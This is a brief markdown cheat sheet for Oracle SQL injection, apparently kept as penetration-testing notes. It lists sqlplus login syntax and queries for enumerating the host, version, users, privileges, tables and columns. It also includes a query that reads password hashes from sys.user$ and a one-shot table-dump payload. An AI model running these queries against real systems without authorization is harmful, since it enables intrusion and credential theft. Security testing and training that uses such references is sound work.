# sqli oracle-sql

## sqlPlus

```
sqlplus USER/PASSWORD@IP/SID [as sysdba]
```

## oracle-sql commands

* [cheatography.com/dormidera/cheat-sheets/oracle-sql-injection/](https://cheatography.com/dormidera/cheat-sheets/oracle-sql-injection/)

**SELECT statements MUST have a FROM clause. Use dummy table `dual`.**

```bash
# comments
--
/* <blah> */

# concat
SELECT 'A'||'B' FROM dual

# hostname
SELECT host_name FROM v$instance
SELECT UTL_INADDR.get_host_name FROM dual

# version
SELECT version FROM v$instance
SELECT banner FROM v$version [WHERE rownum=1]

# users
SELECT user FROM dual
SELECT username FROM all_users
SELECT name FROM sys.user$

# user privs
SELECT * from user_role_privs

# password (DES)
# astatus = if account is locked
SELECT password, astatus FROM sys.user$
SELECT name,spare4 FROM sys.user$

# databases
SELECT global_name FROM global_name
SELECT name FROM v$database
SELECT instance_name FROM v$instance
SELECT SYS.DATABASE_NAME FROM DUAL
| SELECT DISTINCT owner FROM all_tables

# tables
SELECT table_name FROM all_tables
# DIOS: dump in one shot
select rtrim(xmlagg(xmlelement(e, table_name || ',')).extract('//text()').extract('//text()') ,',') from all_tables
| (SELECT replace(wm_concat('<li>'||table_name),',','') FROM all_tables)

# cols
SELECT column_name FROM all_tab_columns WHERE table_name = '<table>'

# 9th row
SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9
```
